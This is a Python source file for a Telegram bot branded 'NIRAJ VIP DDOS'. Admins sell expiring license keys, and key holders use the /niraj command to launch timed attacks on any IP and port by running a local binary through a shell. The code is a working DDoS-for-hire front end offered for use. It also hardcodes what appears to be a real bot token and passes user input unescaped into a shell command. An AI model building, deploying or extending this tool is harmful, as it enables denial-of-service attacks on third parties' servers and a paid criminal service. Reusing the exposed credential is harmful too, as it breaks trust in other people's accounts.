import random
import time
import subprocess
import asyncio
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
# Configure logging
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Replace with your actual bot token
BOT_TOKEN = "7951820824:AAF9Vltkk1PegYV-yP_C4eX4DtaUc9F1Q2o"

# Replace with the Telegram user ID of the admin
ADMIN_ID = 6942423757

# Dictionary to store keys with their status and expiration
keys_db = {}

# Example user database and cooldown tracking
user_db = {
    12345: {'status': 'active'},
    67890: {'status': 'inactive'},
}

def generate_key(hours: int = 0, days: int = 0, minutes: int = 0) -> str:
    """
    Generates a 5-character key with a validity period.

    Args:
        hours (int): Validity period in hours.
        days (int): Validity period in days.
        minutes (int): Validity period in minutes.

    Returns:
        str: The generated 5-character key.
    """
    key = "NIRAJ-VIP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    expiration_time = datetime.now() + timedelta(hours=hours, days=days, minutes=minutes)
    keys_db[key] = {"status": "unused", "expires_at": expiration_time}
    return key

def is_admin(user_id: int) -> bool:
    """
    Checks if the user is an admin.
    
    Args:
        user_id (int): The Telegram user ID of the user.

    Returns:
        bool: True if the user is an admin, False otherwise.
    """
    return user_id == ADMIN_ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Responds with a welcome message when the /start command is issued.
    """
    user = update.effective_user
    is_user_admin = is_admin(user.id)
    admin_message = "🛠 You have admin privileges.\n" if is_user_admin else ""
    
    welcome_message = (
        f"⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐍𝐈𝐑𝐀𝐉 𝐕𝐈𝐏 𝐃𝐃𝐎𝐒⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 @{user.username}!\n"
        f"🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: {user.id}\n\n"
        f"{admin_message}"
        "🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        "• /niraj - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n"
        "• /redeem - 𝗔𝗰𝘁𝗶𝗩𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n"
        "• /check - 𝗠𝗮𝘁𝗿𝗶𝘂𝘁𝗬𝗽𝗘𝗙 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀\n\n"
        "💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌\n"
        "💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n"
        "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n"
        "📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @H3X_neeraj\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    await update.message.reply_text(welcome_message)

import time  # Import for cooldown management

# Dictionary to store the last usage time of the /niraj command by each user
last_used = {}

async def run_attack_command_async(chat_id, ip, port, time_duration):
    """
    Asynchronously runs the attack command.
    """
    command = f"./841 {ip} {port} {time_duration}"
    process = await asyncio.create_subprocess_shell(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return stdout.decode(), stderr.decode()

async def niraj(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        user_id = update.effective_user.id

        # User authorization check
        if user_id not in user_db or user_db[user_id]['status'] != 'active':
            await update.message.reply_text(
                "⛔️ **Unauthorized Access**\n"
                "💡 To gain access, redeem a valid key.\n\n"
                "🛒 **Purchase keys**:\n"
                "Contact any admin or reseller.\n"
                "📢 **CHANNEL**: ➡️ [@H3X_neeraj](https://t.me/+7_J9_juEnU9mMjM9)"
            )
            return

        # Cooldown logic
        current_time = time.time()
        if user_id in last_used:
            time_elapsed = current_time - last_used[user_id]
            cooldown_remaining = 300 - time_elapsed  # 300 seconds = 5 minutes
            if cooldown_remaining > 0:
                await update.message.reply_text(
                    f"⏳ **Cooldown Active**\n"
                    f"⚠️ Please wait {int(cooldown_remaining)} seconds before using this command again."
                )
                return

        # Argument validation
        if len(context.args) == 3:
            ip = context.args[0]
            port = context.args[1]
            try:
                time_duration = int(context.args[2])
                if time_duration > 180:
                    await update.message.reply_text(
                        "⚠️ **Time Limit Exceeded**\n"
                        "🕒 **Max Attack Time**: 180 seconds."
                    )
                    return

                # Update last_used timestamp
                last_used[user_id] = current_time

                # Immediate response to user
                start_time = datetime.now()
                end_time = start_time + timedelta(seconds=time_duration)

                await update.message.reply_text(
                    f"🚀 **ATTACK LAUNCHED**\n\n"
                    f"**🎯 Target**: {ip}\n"
                    f"**🔢 Port**: {port}\n"
                    f"**🕒 Duration**: {time_duration} seconds\n\n"
                    "⏳ **Status**: Attack in progress..."
                )

                # Run the attack command asynchronously
                stdout, stderr = await run_attack_command_async(update.effective_chat.id, ip, port, time_duration)

                # Send attack completion message
                await update.message.reply_text(
                    f"✅ **ATTACK COMPLETED**\n\n"
                    f"**🎯 Target**: {ip}\n"
                    f"**🔢 Port**: {port}\n"
                    f"**🕒 Duration**: {time_duration} seconds\n"
                    f"**📅 Started**: {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"**📅 Ended**: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    "🚩 **Status**: Attack Completed Successfully!"
                )

                # Log the outputs for debugging
                if stdout:
                    print(f"STDOUT: {stdout}")
                if stderr:
                    print(f"STDERR: {stderr}")

            except ValueError:
                await update.message.reply_text(
                    "⚠️ **Invalid Arguments**\n"
                    "📝 **Usage**: /niraj <ip> <port> <time>\n"
                    "📌 Example: `/niraj 1.1.1.1 80 120`"
                )
        else:
            # Show usage instructions if arguments are incorrect
            await update.message.reply_text(
                "⚡️ **niraj VIP DDOS**\n"
                "━━━━━━━━━━━━━━━\n"
                "📝 **Usage**: `/niraj <ip> <port> <time>`\n\n"
                "📌 Example: `/niraj 1.1.1.1 80 120`\n\n"
                "⚠️ **Limitations**:\n"
                "• **Max Time**: 180 seconds\n"
                "• **Cooldown**: 5 minutes\n\n"
                "📢 **CHANNEL**: ➡️ [@H3X_neeraj](https://t.me/+7_J9_juEnU9mMjM9)\n"
                "━━━━━━━━━━━━━━━"
            )

    except Exception as e:
        await update.message.reply_text("❌ An error occurred while processing your request.")
        print(f"Error: {str(e)}")


async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Command to generate a key with a specified validity period.
    Restricted to admin users.
    """
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    try:
        if len(context.args) < 3:
            await update.message.reply_text("Usage: /genkey <hours> <days> <minutes>")
            return

        # Parse the validity period
        hours = int(context.args[0])
        days = int(context.args[1])
        minutes = int(context.args[2])

        key = generate_key(hours=hours, days=days, minutes=minutes)
        await update.message.reply_text(f"Generated Key: {key}\nValid until: {keys_db[key]['expires_at']}")
    except ValueError:
        await update.message.reply_text("Please provide valid numbers for hours, days, and minutes.")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Command to redeem a key.
    """
    if context.args:
        key_to_redeem = " ".join(context.args).strip()
        if key_to_redeem in keys_db:
            key_data = keys_db[key_to_redeem]
            if datetime.now() > key_data["expires_at"]:
                await update.message.reply_text(
                    "❌ 𝗧𝗵𝗶𝘀 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱.\n"
                    "💡 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 𝗳𝗼𝗿 𝗮 𝗻𝗲𝘄 𝗸𝗲𝘆."
                )
            elif key_data["status"] == "unused":
                keys_db[key_to_redeem]["status"] = "used"
                user_db[update.effective_user.id] = {"status": "active", "expires_at": key_data["expires_at"]}
                await update.message.reply_text(
                    "✅ 𝗞𝗲𝘆 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n"
                    f"🔑 𝗩𝗮𝗹𝗶𝗱 𝘂𝗻𝘁𝗶𝗹: {key_data['expires_at'].strftime('%Y-%m-%d %H:%M:%S IST')}"
                )
            else:
                await update.message.reply_text("❌ 𝗧𝗵𝗶𝘀 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗲𝗲𝗻 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱.")
        else:
            await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
    else:
        await update.message.reply_text(
            "💎 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗠𝗣𝗧𝗜𝗢𝗡\n"
            "━━━━━━━━━━━━━━━\n"
            "📝 𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗱𝗲𝗲𝗺 NIRAJ-VIP-𝗫𝗫𝗫𝗫\n\n"
            "⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁 𝗡𝗼𝘁𝗲𝘀:\n"
            "• 𝗞𝗲𝘆𝘀 𝗮𝗿𝗲 𝗰𝗮𝘀𝗲-𝘀𝗲𝗻𝘀𝗶𝘁𝗶𝘃𝗲\n"
            "• 𝗢𝗻𝗲-𝘁𝗶𝗺𝗲 𝘂𝘀𝗲 𝗼𝗻𝗹𝘆\n"
            "• 𝗡𝗼𝗻-𝘁𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗮𝗯𝗹𝗲\n\n"
            "🔑 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /redeem NIRAJ-VIP-𝗔𝗕𝗖𝗗𝟭𝟮𝟯𝟰\n\n"
            "💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆? 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n"
            "━━━━━━━━━━━━━━━"
        )


async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Command to check the status of a user.
    """
    user = update.effective_user
    user_id = user.id
    username = user.username or "Unknown"
    
    # Check if user has an active subscription
    if user_id in user_db and user_db[user_id]["status"] == "active":
        expiration_time = user_db[user_id]["expires_at"]
        subscription_status = "✅ ACTIVE"
        subscription_expiry = expiration_time.strftime("%Y-%m-%d %H:%M:%S IST")
    else:
        subscription_status = "❌ INACTIVE"
        subscription_expiry = "No active subscription"
    
    # Server and cooldown status (static for now, can be dynamic)
    server_status = "🟢 SERVERS AVAILABLE"
    cooldown_status = "🟢 Ready"
    cooldown_duration = "5 minutes per attack"

    # Current time for the last updated field
    last_updated = datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")
    
    reply_message = (
        f"⚡️𝐍𝐈𝐑𝐀𝐉 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒 ⚡️\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 𝗨𝘀𝗲𝗿: @{username}\n"
        f"🆔 𝗜𝗗: {user_id}\n\n"
        f"💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻:\n"
        f"•𝗦𝘁𝗮𝘁𝘂𝘀: {subscription_status}\n"
        f"•𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {subscription_expiry}\n\n"
        f"🖥️ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
        f"•𝗦𝘁𝗮𝘁𝘂𝘀: {server_status}\n"
        f"•𝗥𝗲𝗮𝗱𝘆 𝗳𝗼𝗿 𝗮𝘁𝘁𝗮𝗰𝗸𝘀\n\n"
        f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
        f"•𝗦𝘁𝗮𝘁𝘂𝘀: {cooldown_status}\n"
        f"•𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {cooldown_duration}\n\n"
        f"⏰ 𝗟𝗮𝘀𝘁 𝗨𝗽𝗱𝗮𝘁𝗲𝗱:\n"
        f"• {last_updated}\n"
        f"━━━━━━━━━━━━━━━"
    )

    await update.message.reply_text(reply_message)

async def user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles the /user command to display the user's own key status (authorization, cooldown, last attack).
    """
    user_id = update.effective_user.id

    # Check if the user is in the user_db (i.e., has a valid key)
    if user_id not in user_db or user_db[user_id]['status'] != 'active':
        await update.message.reply_text(
            "⛔️ **𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀**\n"            "𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆 𝗼𝗿 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 𝗶𝘀 𝗶𝗻𝗮𝗰𝘁𝗶𝘃𝗲."
        )
        return

    # Fetch the user's authorization status
    user_info = user_db[user_id]
    is_authorized = "Active" if user_info['status'] == 'active' else "Inactive"

    # Cooldown logic
    if user_id in last_used:
        current_time = time.time()
        time_elapsed = current_time - last_used[user_id]
        cooldown_remaining = 300 - time_elapsed  # 300 seconds = 5 minutes
        cooldown_status = f"{int(cooldown_remaining)} seconds remaining" if cooldown_remaining > 0 else "No cooldown"
    else:
        cooldown_status = "No cooldown"

    # Last attack time
    last_attack_time = datetime.now() - timedelta(seconds=current_time - last_used.get(user_id, 0))
    last_attack_time_str = last_attack_time.strftime('%Y-%m-%d %H:%M:%S') if user_id in last_used else "N/A"

    # Prepare the user status message
    message = (
        f"🔑 **𝗬𝗼𝘂𝗿 𝗞𝗲𝘆 𝗦𝘁𝗮𝘁𝘂𝘀**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗮𝘁𝗶𝗼𝗻**: {is_authorized}\n"
        f"**𝗟𝗮𝘀𝘁 𝗔𝘁𝘁𝗮𝗰𝗸: {last_attack_time_str}\n"
        f"**𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗦𝘁𝗮𝘁𝘂𝘀**: {cooldown_status}\n"
        "━━━━━━━━━━━━━━━\n"
    )

    # Send the status to the user
    await update.message.reply_text(message)
    

def main() -> None:
    """Run the bot."""
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("niraj", niraj))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("check", check_status))
    application.add_handler(CommandHandler("user", user))

    # Run the bot
    application.run_polling()

if __name__ == "__main__":
    main()

